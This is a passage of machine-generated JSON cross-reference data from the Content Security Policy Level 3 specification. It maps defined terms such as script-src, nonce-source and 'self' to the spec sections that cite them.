"},{"refs":[{"id":"ref-for-concept-response\u2461\u2461"}],"title":"6.1.5.2. \n    frame-src Post-request check\n  "},{"refs":[{"id":"ref-for-concept-response\u2461\u2462"}],"title":"6.1.6.2. \n    img-src Post-request check\n  "},{"refs":[{"id":"ref-for-concept-response\u2461\u2463"}],"title":"6.1.7.2. \n    manifest-src Post-request check\n  "},{"refs":[{"id":"ref-for-concept-response\u2461\u2464"}],"title":"6.1.8.2. \n    media-src Post-request check\n  "},{"refs":[{"id":"ref-for-concept-response\u2461\u2465"}],"title":"6.1.9.2. \n    object-src Post-request check\n  "},{"refs":[{"id":"ref-for-concept-response\u2461\u2466"}],"title":"6.1.10.2. \n    prefetch-src Post-request check\n  "},{"refs":[{"id":"ref-for-concept-response\u2461\u2467"}],"title":"6.1.11. script-src"},{"refs":[{"id":"ref-for-concept-response\u2461\u2468"}],"title":"6.1.11.2. \n    script-src Post-request check\n  "},{"refs":[{"id":"ref-for-concept-response\u2462\u24ea"}],"title":"6.1.12.2. \n    script-src-elem Post-request check\n  "},{"refs":[{"id":"ref-for-concept-response\u2462\u2460"}],"title":"6.1.14. style-src"},{"refs":[{"id":"ref-for-concept-response\u2462\u2461"}],"title":"6.1.14.2. \n    style-src Post-request Check\n  "},{"refs":[{"id":"ref-for-concept-response\u2462\u2462"}],"title":"6.1.15.2. \n    style-src-elem Post-request Check\n  "},{"refs":[{"id":"ref-for-concept-response\u2462\u2463"}],"title":"6.1.17.2. \n    worker-src Post-request Check\n  "},{"refs":[{"id":"ref-for-concept-response\u2462\u2464"}],"title":"6.2.2.1. \n    sandbox Response Check\n  "},{"refs":[{"id":"ref-for-concept-response\u2462\u2465"}],"title":"6.2.2.2. \n    sandbox Initialization\n  "},{"refs":[{"id":"ref-for-concept-response\u2462\u2466"}],"title":"6.3.2.1. \n    frame-ancestors Navigation Response Check\n  "},{"refs":[{"id":"ref-for-concept-response\u2462\u2467"},{"id":"ref-for-concept-response\u2462\u2468"}],"title":"6.3.3.1. \n    navigate-to Pre-Navigation Check\n  "},{"refs":[{"id":"ref-for-concept-response\u2463\u24ea"}],"title":"6.3.3.2. \n    navigate-to Navigation Response Check\n  "},{"refs":[{"id":"ref-for-concept-response\u2463\u2460"}],"title":"6.6.1.2. \n    Script directives post-request check\n  "},{"refs":[{"id":"ref-for-concept-response\u2463\u2461"}],"title":"6.6.2.4. \n    Does response to request match source list?\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-response"},
"embedding-document": {"dfnID":"embedding-document","dfnText":"embedding document","external":false,"refSections":[{"refs":[{"id":"ref-for-embedding-document"},{"id":"ref-for-embedding-document\u2460"}],"title":"4.2.1. \n    Initialize a Document\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-embedding-document\u2461"}],"title":"4.2.2. \n    Initialize a global object\u2019s CSP list\n  "}],"url":"#embedding-document"},
"enforced": {"dfnID":"enforced","dfnText":"enforced","external":false,"refSections":[{"refs":[{"id":"ref-for-enforced"}],"title":"3.1. \n    The Content-Security-Policy HTTP Response Header Field\n  "},{"refs":[{"id":"ref-for-enforced\u2460"}],"title":"4.2. \n    Integration with HTML\n  "}],"url":"#enforced"},
"enumdef-securitypolicyviolationeventdisposition": {"dfnID":"enumdef-securitypolicyviolationeventdisposition","dfnText":"SecurityPolicyViolationEventDisposition","external":false,"refSections":[{"refs":[{"id":"ref-for-enumdef-securitypolicyviolationeventdisposition"}],"title":"5. \n    Reporting\n  "},{"refs":[{"id":"ref-for-enumdef-securitypolicyviolationeventdisposition\u2460"},{"id":"ref-for-enumdef-securitypolicyviolationeventdisposition\u2461"}],"title":"5.1. \n    Violation DOM Events\n  "}],"url":"#enumdef-securitypolicyviolationeventdisposition"},
"f06432d7": {"dfnID":"f06432d7","dfnText":"URL","external":true,"refSections":[{"refs":[{"id":"ref-for-url"},{"id":"ref-for-url\u2460"},{"id":"ref-for-url\u2461"},{"id":"ref-for-url\u2462"}],"title":"2.4. Violations"},{"refs":[{"id":"ref-for-url\u2463"}],"title":"6.2.1. base-uri"},{"refs":[{"id":"ref-for-url\u2464"}],"title":"6.2.1.1. \n    Is base allowed for document?\n  "},{"refs":[{"id":"ref-for-url\u2465"}],"title":"6.3.1. form-action"},{"refs":[{"id":"ref-for-url\u2466"}],"title":"6.3.2. frame-ancestors"},{"refs":[{"id":"ref-for-url\u2467"}],"title":"6.3.3. navigate-to"},{"refs":[{"id":"ref-for-url\u2468"}],"title":"6.6.2.5. \n    Does url match source list in origin with redirect count?\n  "},{"refs":[{"id":"ref-for-url\u2460\u24ea"}],"title":"6.6.2.6. \n    Does url match expression in origin with redirect count?\n  "}],"url":"https://url.spec.whatwg.org/#url"},
"f78d5b5c": {"dfnID":"f78d5b5c","dfnText":"origin","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-request-origin"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-request-origin"},
"f7b00a8b": {"dfnID":"f7b00a8b","dfnText":"header list (for response)","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-response-header-list"}],"title":"4.1. \n    Integration with Fetch\n  "},{"refs":[{"id":"ref-for-concept-response-header-list\u2460"},{"id":"ref-for-concept-response-header-list\u2461"},{"id":"ref-for-concept-response-header-list\u2462"}],"title":"4.1.1. \n    Set response\u2019s CSP list\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-response-header-list"},
"f937b7b6": {"dfnID":"f937b7b6","dfnText":"continue","external":true,"refSections":[{"refs":[{"id":"ref-for-iteration-continue"},{"id":"ref-for-iteration-continue\u2460"}],"title":"2.2.1. \n    Parse a serialized CSP\n  "},{"refs":[{"id":"ref-for-iteration-continue\u2461"}],"title":"2.2.2. \n    Parse a serialized CSP list\n  "}],"url":"https://infra.spec.whatwg.org/#iteration-continue"},
"fa4ea124": {"dfnID":"fa4ea124","dfnText":"initiator","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-request-initiator"}],"title":"5.3. \n    Report a violation\n  "},{"refs":[{"id":"ref-for-concept-request-initiator\u2460"},{"id":"ref-for-concept-request-initiator\u2461"}],"title":"6.7.1. \n    Get the effective directive for request\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-request-initiator"},
"fe4f8855": {"dfnID":"fe4f8855","dfnText":"base64url encoding","external":true,"refSections":[{"refs":[{"id":"ref-for-section-5"}],"title":"2.3.1. Source Lists"},{"refs":[{"id":"ref-for-section-5\u2460"}],"title":"6.6.3.3. \n    Does element match source list for type and source?\n  "}],"url":"https://tools.ietf.org/html/rfc4648#section-5"},
"fetch-directives": {"dfnID":"fetch-directives","dfnText":"Fetch directives","external":false,"refSections":[{"refs":[{"id":"ref-for-fetch-directives"},{"id":"ref-for-fetch-directives\u2460"}],"title":"6.1.3. default-src"},{"refs":[{"id":"ref-for-fetch-directives\u2461"}],"title":"6.7.1. \n    Get the effective directive for request\n  "},{"refs":[{"id":"ref-for-fetch-directives\u2462"}],"title":"6.7.4. \n    Should fetch directive execute\n  "}],"url":"#fetch-directives"},
"font-src": {"dfnID":"font-src","dfnText":"font-src","external":false,"refSections":[{"refs":[{"id":"ref-for-font-src"}],"title":"6.1. \n    Fetch Directives\n  "},{"refs":[{"id":"ref-for-font-src\u2460"},{"id":"ref-for-font-src\u2461"}],"title":"6.1.3. default-src"},{"refs":[{"id":"ref-for-font-src\u2462"}],"title":"6.1.4. font-src"},{"refs":[{"id":"ref-for-font-src\u2463"}],"title":"10.1. \n    Directive Registry\n  "}],"url":"#font-src"},
"form-action": {"dfnID":"form-action","dfnText":"form-action","external":false,"refSections":[{"refs":[{"id":"ref-for-form-action"}],"title":"6.3.3. navigate-to"},{"refs":[{"id":"ref-for-form-action\u2460"}],"title":"10.1. \n    Directive Registry\n  "}],"url":"#form-action"},
"frame-ancestors": {"dfnID":"frame-ancestors","dfnText":"frame-ancestors","external":false,"refSections":[{"refs":[{"id":"ref-for-frame-ancestors"}],"title":"4.2.6. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-frame-ancestors\u2460"}],"title":"6.3.2.1. \n    frame-ancestors Navigation Response Check\n  "},{"refs":[{"id":"ref-for-frame-ancestors\u2461"},{"id":"ref-for-frame-ancestors\u2462"},{"id":"ref-for-frame-ancestors\u2463"}],"title":"6.3.2.2. \n\t\tRelation to X-Frame-Options\n\t"},{"refs":[{"id":"ref-for-frame-ancestors\u2464"}],"title":"10.1. \n    Directive Registry\n  "}],"url":"#frame-ancestors"},
"frame-src": {"dfnID":"frame-src","dfnText":"frame-src","external":false,"refSections":[{"refs":[{"id":"ref-for-frame-src"},{"id":"ref-for-frame-src\u2460"}],"title":"6.1.3. default-src"},{"refs":[{"id":"ref-for-frame-src\u2461"}],"title":"6.1.5. frame-src"},{"refs":[{"id":"ref-for-frame-src\u2462"}],"title":"10.1. \n    Directive Registry\n  "}],"url":"#frame-src"},
"global-object-csp-list": {"dfnID":"global-object-csp-list","dfnText":"CSP list","external":false,"refSections":[{"refs":[{"id":"ref-for-global-object-csp-list"}],"title":"4.1. \n    Integration with Fetch\n  "},{"refs":[{"id":"ref-for-global-object-csp-list\u2460"}],"title":"4.1.2. \n    Report Content Security Policy violations for request\n  "},{"refs":[{"id":"ref-for-global-object-csp-list\u2461"}],"title":"4.1.3. \n    Should request be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-global-object-csp-list\u2462"}],"title":"4.1.4. \n    Should response to request be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-global-object-csp-list\u2463"}],"title":"4.2. \n    Integration with HTML\n  "},{"refs":[{"id":"ref-for-global-object-csp-list\u2464"}],"title":"4.2.1. \n    Initialize a Document\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-global-object-csp-list\u2465"},{"id":"ref-for-global-object-csp-list\u2466"},{"id":"ref-for-global-object-csp-list\u2467"},{"id":"ref-for-global-object-csp-list\u2468"},{"id":"ref-for-global-object-csp-list\u2460\u24ea"},{"id":"ref-for-global-object-csp-list\u2460\u2460"}],"title":"4.2.2. \n    Initialize a global object\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-global-object-csp-list\u2460\u2461"},{"id":"ref-for-global-object-csp-list\u2460\u2462"},{"id":"ref-for-global-object-csp-list\u2460\u2463"},{"id":"ref-for-global-object-csp-list\u2460\u2464"}],"title":"4.2.3. \n    Retrieve the CSP list of an object\n  "},{"refs":[{"id":"ref-for-global-object-csp-list\u2460\u2465"}],"title":"4.2.4. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-global-object-csp-list\u2460\u2466"},{"id":"ref-for-global-object-csp-list\u2460\u2467"}],"title":"4.2.5. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-global-object-csp-list\u2460\u2468"}],"title":"4.2.6. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-global-object-csp-list\u2461\u24ea"}],"title":"4.3. Integration with ECMAScript"},{"refs":[{"id":"ref-for-global-object-csp-list\u2461\u2460"}],"title":"4.3.1. \n    EnsureCSPDoesNotBlockStringCompilation(callerRealm, calleeRealm, source)\n  "},{"refs":[{"id":"ref-for-global-object-csp-list\u2461\u2461"}],"title":"6.2.1.1. \n    Is base allowed for document?\n  "},{"refs":[{"id":"ref-for-global-object-csp-list\u2461\u2462"},{"id":"ref-for-global-object-csp-list\u2461\u2463"},{"id":"ref-for-global-object-csp-list\u2461\u2464"},{"id":"ref-for-global-object-csp-list\u2461\u2465"}],"title":"7.8. \n    CSP Inheriting to avoid bypasses\n  "}],"url":"#global-object-csp-list"},
"grammardef-ancestor-source": {"dfnID":"grammardef-ancestor-source","dfnText":"ancestor-source","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-ancestor-source"},{"id":"ref-for-grammardef-ancestor-source\u2460"}],"title":"6.3.2. frame-ancestors"}],"url":"#grammardef-ancestor-source"},
"grammardef-ancestor-source-list": {"dfnID":"grammardef-ancestor-source-list","dfnText":"ancestor-source-list","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-ancestor-source-list"}],"title":"6.3.2. frame-ancestors"}],"url":"#grammardef-ancestor-source-list"},
"grammardef-base64-value": {"dfnID":"grammardef-base64-value","dfnText":"base64-value","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-base64-value"},{"id":"ref-for-grammardef-base64-value\u2460"},{"id":"ref-for-grammardef-base64-value\u2461"},{"id":"ref-for-grammardef-base64-value\u2462"}],"title":"2.3.1. Source Lists"},{"refs":[{"id":"ref-for-grammardef-base64-value\u2463"}],"title":"6.6.1.1. \n    Script directives pre-request check\n  "},{"refs":[{"id":"ref-for-grammardef-base64-value\u2464"}],"title":"6.6.2.2. \n    Does nonce match source list?\n  "},{"refs":[{"id":"ref-for-grammardef-base64-value\u2465"},{"id":"ref-for-grammardef-base64-value\u2466"}],"title":"6.6.3.3. \n    Does element match source list for type and source?\n  "}],"url":"#grammardef-base64-value"},
"grammardef-directive-name": {"dfnID":"grammardef-directive-name","dfnText":"directive-name","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-directive-name"}],"title":"2.3. Directives"}],"url":"#grammardef-directive-name"},
"grammardef-directive-value": {"dfnID":"grammardef-directive-value","dfnText":"directive-value","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-directive-value"}],"title":"2.3. Directives"}],"url":"#grammardef-directive-value"},
"grammardef-hash-algorithm": {"dfnID":"grammardef-hash-algorithm","dfnText":"hash-algorithm","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-hash-algorithm"}],"title":"2.3.1. Source Lists"},{"refs":[{"id":"ref-for-grammardef-hash-algorithm\u2460"},{"id":"ref-for-grammardef-hash-algorithm\u2461"}],"title":"6.6.1.1. \n    Script directives pre-request check\n  "},{"refs":[{"id":"ref-for-grammardef-hash-algorithm\u2462"},{"id":"ref-for-grammardef-hash-algorithm\u2463"},{"id":"ref-for-grammardef-hash-algorithm\u2464"}],"title":"6.6.3.3. \n    Does element match source list for type and source?\n  "}],"url":"#grammardef-hash-algorithm"},
"grammardef-hash-source": {"dfnID":"grammardef-hash-source","dfnText":"hash-source","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-hash-source"},{"id":"ref-for-grammardef-hash-source\u2460"}],"title":"2.3.1. Source Lists"},{"refs":[{"id":"ref-for-grammardef-hash-source\u2461"}],"title":"6.1.11. script-src"},{"refs":[{"id":"ref-for-grammardef-hash-source\u2462"}],"title":"6.1.14. style-src"},{"refs":[{"id":"ref-for-grammardef-hash-source\u2463"},{"id":"ref-for-grammardef-hash-source\u2464"}],"title":"6.6.1.1. \n    Script directives pre-request check\n  "},{"refs":[{"id":"ref-for-grammardef-hash-source\u2465"}],"title":"6.6.3.2. \n    Does a source list allow all inline behavior for type?\n  "},{"refs":[{"id":"ref-for-grammardef-hash-source\u2466"}],"title":"6.6.3.3. \n    Does element match source list for type and source?\n  "},{"refs":[{"id":"ref-for-grammardef-hash-source\u2467"}],"title":"8.2. \n    Usage of \"'strict-dynamic'\"\n  "},{"refs":[{"id":"ref-for-grammardef-hash-source\u2468"}],"title":"8.4. \n      Allowing external JavaScript via hashes\n    "}],"url":"#grammardef-hash-source"},
"grammardef-host-char": {"dfnID":"grammardef-host-char","dfnText":"host-char","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-host-char"},{"id":"ref-for-grammardef-host-char\u2460"},{"id":"ref-for-grammardef-host-char\u2461"}],"title":"2.3.1. Source Lists"}],"url":"#grammardef-host-char"},
"grammardef-host-part": {"dfnID":"grammardef-host-part","dfnText":"host-part","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-host-part"}],"title":"2.3.1. Source Lists"},{"refs":[{"id":"ref-for-grammardef-host-part\u2460"}],"title":"6.6.2.6. \n    Does url match expression in origin with redirect count?\n  "},{"refs":[{"id":"ref-for-grammardef-host-part\u2461"}],"title":"6.6.2.8. \n    host-part matching\n  "}],"url":"#grammardef-host-part"},
"grammardef-host-source": {"dfnID":"grammardef-host-source","dfnText":"host-source","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-host-source"}],"title":"2.3.1. Source Lists"},{"refs":[{"id":"ref-for-grammardef-host-source\u2460"}],"title":"6.3.2. frame-ancestors"},{"refs":[{"id":"ref-for-grammardef-host-source\u2461"},{"id":"ref-for-grammardef-host-source\u2462"},{"id":"ref-for-grammardef-host-source\u2463"}],"title":"6.6.2.6. \n    Does url match expression in origin with redirect count?\n  "},{"refs":[{"id":"ref-for-grammardef-host-source\u2464"}],"title":"7.3. Nonce Retargeting"},{"refs":[{"id":"ref-for-grammardef-host-source\u2465"}],"title":"8.2. \n    Usage of \"'strict-dynamic'\"\n  "}],"url":"#grammardef-host-source"},
"grammardef-keyword-source": {"dfnID":"grammardef-keyword-source","dfnText":"keyword-source","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-keyword-source"}],"title":"2.3.1. Source Lists"},{"refs":[{"id":"ref-for-grammardef-keyword-source\u2460"}],"title":"6.3.3.1. \n    navigate-to Pre-Navigation Check\n  "},{"refs":[{"id":"ref-for-grammardef-keyword-source\u2461"}],"title":"6.3.3.2. \n    navigate-to Navigation Response Check\n  "},{"refs":[{"id":"ref-for-grammardef-keyword-source\u2462"}],"title":"6.6.1.1. \n    Script directives pre-request check\n  "},{"refs":[{"id":"ref-for-grammardef-keyword-source\u2463"},{"id":"ref-for-grammardef-keyword-source\u2464"},{"id":"ref-for-grammardef-keyword-source\u2465"}],"title":"6.6.3.2. \n    Does a source list allow all inline behavior for type?\n  "},{"refs":[{"id":"ref-for-grammardef-keyword-source\u2466"}],"title":"6.6.3.3. \n    Does element match source list for type and source?\n  "},{"refs":[{"id":"ref-for-grammardef-keyword-source\u2467"}],"title":"8.2. \n    Usage of \"'strict-dynamic'\"\n  "}],"url":"#grammardef-keyword-source"},
"grammardef-nonce-source": {"dfnID":"grammardef-nonce-source","dfnText":"nonce-source","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-nonce-source"},{"id":"ref-for-grammardef-nonce-source\u2460"}],"title":"2.3.1. Source Lists"},{"refs":[{"id":"ref-for-grammardef-nonce-source\u2461"}],"title":"6.1.11. script-src"},{"refs":[{"id":"ref-for-grammardef-nonce-source\u2462"}],"title":"6.1.14. style-src"},{"refs":[{"id":"ref-for-grammardef-nonce-source\u2463"}],"title":"6.6.2.2. \n    Does nonce match source list?\n  "},{"refs":[{"id":"ref-for-grammardef-nonce-source\u2464"}],"title":"6.6.3.1. \n    Is element nonceable?\n  "},{"refs":[{"id":"ref-for-grammardef-nonce-source\u2465"}],"title":"6.6.3.2. \n    Does a source list allow all inline behavior for type?\n  "},{"refs":[{"id":"ref-for-grammardef-nonce-source\u2466"}],"title":"6.6.3.3. \n    Does element match source list for type and source?\n  "},{"refs":[{"id":"ref-for-grammardef-nonce-source\u2467"}],"title":"7.1. Nonce Reuse"},{"refs":[{"id":"ref-for-grammardef-nonce-source\u2468"}],"title":"8.2. \n    Usage of \"'strict-dynamic'\"\n  "}],"url":"#grammardef-nonce-source"},
"grammardef-none": {"dfnID":"grammardef-none","dfnText":"'none'","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-none"}],"title":"2.3.1. Source Lists"},{"refs":[{"id":"ref-for-grammardef-none\u2460"}],"title":"6.3.2. frame-ancestors"}],"url":"#grammardef-none"},
"grammardef-optional-ascii-whitespace": {"dfnID":"grammardef-optional-ascii-whitespace","dfnText":"optional-ascii-whitespace","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-optional-ascii-whitespace"},{"id":"ref-for-grammardef-optional-ascii-whitespace\u2460"},{"id":"ref-for-grammardef-optional-ascii-whitespace\u2461"},{"id":"ref-for-grammardef-optional-ascii-whitespace\u2462"},{"id":"ref-for-grammardef-optional-ascii-whitespace\u2463"}],"title":"2.1. Infrastructure"},{"refs":[{"id":"ref-for-grammardef-optional-ascii-whitespace\u2464"},{"id":"ref-for-grammardef-optional-ascii-whitespace\u2465"}],"title":"2.2. Policies"}],"url":"#grammardef-optional-ascii-whitespace"},
"grammardef-path-part": {"dfnID":"grammardef-path-part","dfnText":"path-part","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-path-part"}],"title":"2.3.1. Source Lists"},{"refs":[{"id":"ref-for-grammardef-path-part\u2460"},{"id":"ref-for-grammardef-path-part\u2461"}],"title":"6.6.2.6. \n    Does url match expression in origin with redirect count?\n  "},{"refs":[{"id":"ref-for-grammardef-path-part\u2462"}],"title":"6.6.2.10. \n    path-part matching\n  "}],"url":"#grammardef-path-part"},
"grammardef-port-part": {"dfnID":"grammardef-port-part","dfnText":"port-part","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-port-part"}],"title":"2.3.1. Source Lists"},{"refs":[{"id":"ref-for-grammardef-port-part\u2460"}],"title":"6.6.2.6. \n    Does url match expression in origin with redirect count?\n  "},{"refs":[{"id":"ref-for-grammardef-port-part\u2461"}],"title":"6.6.2.9. \n    port-part matching\n  "}],"url":"#grammardef-port-part"},
"grammardef-report-sample": {"dfnID":"grammardef-report-sample","dfnText":"'report-sample'","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-report-sample"}],"title":"1.3. Changes from Level 2"},{"refs":[{"id":"ref-for-grammardef-report-sample\u2460"}],"title":"4.2.4. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-grammardef-report-sample\u2461"}],"title":"4.3.1. \n    EnsureCSPDoesNotBlockStringCompilation(callerRealm, calleeRealm, source)\n  "}],"url":"#grammardef-report-sample"},
"grammardef-required-ascii-whitespace": {"dfnID":"grammardef-required-ascii-whitespace","dfnText":"required-ascii-whitespace","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-required-ascii-whitespace"},{"id":"ref-for-grammardef-required-ascii-whitespace\u2460"}],"title":"2.3. Directives"},{"refs":[{"id":"ref-for-grammardef-required-ascii-whitespace\u2461"}],"title":"2.3.1. Source Lists"},{"refs":[{"id":"ref-for-grammardef-required-ascii-whitespace\u2462"}],"title":"6.2.2. sandbox"},{"refs":[{"id":"ref-for-grammardef-required-ascii-whitespace\u2463"}],"title":"6.3.2. frame-ancestors"},{"refs":[{"id":"ref-for-grammardef-required-ascii-whitespace\u2464"}],"title":"6.4.1. report-uri"}],"url":"#grammardef-required-ascii-whitespace"},
"grammardef-scheme-part": {"dfnID":"grammardef-scheme-part","dfnText":"scheme-part","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-scheme-part"},{"id":"ref-for-grammardef-scheme-part\u2460"}],"title":"2.3.1. Source Lists"},{"refs":[{"id":"ref-for-grammardef-scheme-part\u2461"},{"id":"ref-for-grammardef-scheme-part\u2462"},{"id":"ref-for-grammardef-scheme-part\u2463"},{"id":"ref-for-grammardef-scheme-part\u2464"}],"title":"6.6.2.6. \n    Does url match expression in origin with redirect count?\n  "},{"refs":[{"id":"ref-for-grammardef-scheme-part\u2465"}],"title":"6.6.2.7. \n    scheme-part matching\n  "}],"url":"#grammardef-scheme-part"},
"grammardef-scheme-source": {"dfnID":"grammardef-scheme-source","dfnText":"scheme-source","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-scheme-source"}],"title":"2.3.1. Source Lists"},{"refs":[{"id":"ref-for-grammardef-scheme-source\u2460"}],"title":"6.3.2. frame-ancestors"},{"refs":[{"id":"ref-for-grammardef-scheme-source\u2461"},{"id":"ref-for-grammardef-scheme-source\u2462"}],"title":"6.6.2.6. \n    Does url match expression in origin with redirect count?\n  "},{"refs":[{"id":"ref-for-grammardef-scheme-source\u2463"}],"title":"8.2. \n    Usage of \"'strict-dynamic'\"\n  "}],"url":"#grammardef-scheme-source"},
"grammardef-self": {"dfnID":"grammardef-self","dfnText":"'self'","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-self"},{"id":"ref-for-grammardef-self\u2460"}],"title":"2.2. Policies"},{"refs":[{"id":"ref-for-grammardef-self\u2461"}],"title":"2.3.1. Source Lists"},{"refs":[{"id":"ref-for-grammardef-self\u2462"},{"id":"ref-for-grammardef-self\u2463"},{"id":"ref-for-grammardef-self\u2464"}],"title":"4.2.1. \n    Initialize a Document\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-grammardef-self\u2465"},{"id":"ref-for-grammardef-self\u2466"},{"id":"ref-for-grammardef-self\u2467"},{"id":"ref-for-grammardef-self\u2468"},{"id":"ref-for-grammardef-self\u2460\u24ea"},{"id":"ref-for-grammardef-self\u2460\u2460"},{"id":"ref-for-grammardef-self\u2460\u2461"},{"id":"ref-for-grammardef-self\u2460\u2462"},{"id":"ref-for-grammardef-self\u2460\u2463"},{"id":"ref-for-grammardef-self\u2460\u2464"},{"id":"ref-for-grammardef-self\u2460\u2465"},{"id":"ref-for-grammardef-self\u2460\u2466"},{"id":"ref-for-grammardef-self\u2460\u2467"},{"id":"ref-for-grammardef-self\u2460\u2468"},{"id":"ref-for-grammardef-self\u2461\u24ea"},{"id":"ref-for-grammardef-self\u2461\u2460"},{"id":"ref-for-grammardef-self\u2461\u2461"},{"id":"ref-for-grammardef-self\u2461\u2462"},{"id":"ref-for-grammardef-self\u2461\u2463"},{"id":"ref-for-grammardef-self\u2461\u2464"},{"id":"ref-for-grammardef-self\u2461\u2465"},{"id":"ref-for-grammardef-self\u2461\u2466"},{"id":"ref-for-grammardef-self\u2461\u2467"},{"id":"ref-for-grammardef-self\u2461\u2468"},{"id":"ref-for-grammardef-self\u2462\u24ea"},{"id":"ref-for-grammardef-self\u2462\u2460"},{"id":"ref-for-grammardef-self\u2462\u2461"}],"title":"6.1.3. default-src"},{"refs":[{"id":"ref-for-grammardef-self\u2462\u2462"}],"title":"6.3.2. frame-ancestors"},{"refs":[{"id":"ref-for-grammardef-self\u2462\u2463"}],"title":"8.2. \n    Usage of \"'strict-dynamic'\"\n  "}],"url":"#grammardef-self"},
"grammardef-serialized-directive": {"dfnID":"grammardef-serialized-directive","dfnText":"serialized-directive","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-serialized-directive"},{"id":"ref-for-grammardef-serialized-directive\u2460"}],"title":"2.2. Policies"}],"url":"#grammardef-serialized-directive"},
"grammardef-serialized-policy": {"dfnID":"grammardef-serialized-policy","dfnText":"serialized-policy","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-serialized-policy"}],"title":"2.2. Policies"},{"refs":[{"id":"ref-for-grammardef-serialized-policy\u2460"}],"title":"3.1. \n    The Content-Security-Policy HTTP Response Header Field\n  "},{"refs":[{"id":"ref-for-grammardef-serialized-policy\u2461"}],"title":"3.2. \n    The Content-Security-Policy-Report-Only HTTP Response Header Field\n  "}],"url":"#grammardef-serialized-policy"},
"grammardef-serialized-policy-list": {"dfnID":"grammardef-serialized-policy-list","dfnText":"serialized-policy-list","external":false,"refSections":[],"url":"#grammardef-serialized-policy-list"},
"grammardef-serialized-source-list": {"dfnID":"grammardef-serialized-source-list","dfnText":"serialized-source-list","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-serialized-source-list"}],"title":"6.1.1. child-src"},{"refs":[{"id":"ref-for-grammardef-serialized-source-list\u2460"}],"title":"6.1.2. connect-src"},{"refs":[{"id":"ref-for-grammardef-serialized-source-list\u2461"}],"title":"6.1.3. default-src"},{"refs":[{"id":"ref-for-grammardef-serialized-source-list\u2462"}],"title":"6.1.4. font-src"},{"refs":[{"id":"ref-for-grammardef-serialized-source-list\u2463"}],"title":"6.1.5. frame-src"},{"refs":[{"id":"ref-for-grammardef-serialized-source-list\u2464"}],"title":"6.1.6. img-src"},{"refs":[{"id":"ref-for-grammardef-serialized-source-list\u2465"}],"title":"6.1.7. manifest-src"},{"refs":[{"id":"ref-for-grammardef-serialized-source-list\u2466"}],"title":"6.1.8. media-src"},{"refs":[{"id":"ref-for-grammardef-serialized-source-list\u2467"}],"title":"6.1.9. object-src"},{"refs":[{"id":"ref-for-grammardef-serialized-source-list\u2468"}],"title":"6.1.10. prefetch-src"},{"refs":[{"id":"ref-for-grammardef-serialized-source-list\u2460\u24ea"}],"title":"6.1.11. script-src"},{"refs":[{"id":"ref-for-grammardef-serialized-source-list\u2460\u2460"}],"title":"6.1.12. script-src-elem"},{"refs":[{"id":"ref-for-grammardef-serialized-source-list\u2460\u2461"}],"title":"6.1.13. script-src-attr"},{"refs":[{"id":"ref-for-grammardef-serialized-source-list\u2460\u2462"}],"title":"6.1.14. style-src"},{"refs":[{"id":"ref-for-grammardef-serialized-source-list\u2460\u2463"}],"title":"6.1.15. style-src-elem"},{"refs":[{"id":"ref-for-grammardef-serialized-source-list\u2460\u2464"}],"title":"6.1.16. style-src-attr"},{"refs":[{"id":"ref-for-grammardef-serialized-source-list\u2460\u2465"}],"title":"6.1.17. worker-src"},{"refs":[{"id":"ref-for-grammardef-serialized-source-list\u2460\u2466"}],"title":"6.2.1. base-uri"},{"refs":[{"id":"ref-for-grammardef-serialized-source-list\u2460\u2467"}],"title":"6.3.1. form-action"},{"refs":[{"id":"ref-for-grammardef-serialized-source-list\u2460\u2468"}],"title":"6.3.3. navigate-to"}],"url":"#grammardef-serialized-source-list"},
"grammardef-source-expression": {"dfnID":"grammardef-source-expression","dfnText":"source-expression","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-source-expression"},{"id":"ref-for-grammardef-source-expression\u2460"}],"title":"2.3.1. Source Lists"}],"url":"#grammardef-source-expression"},
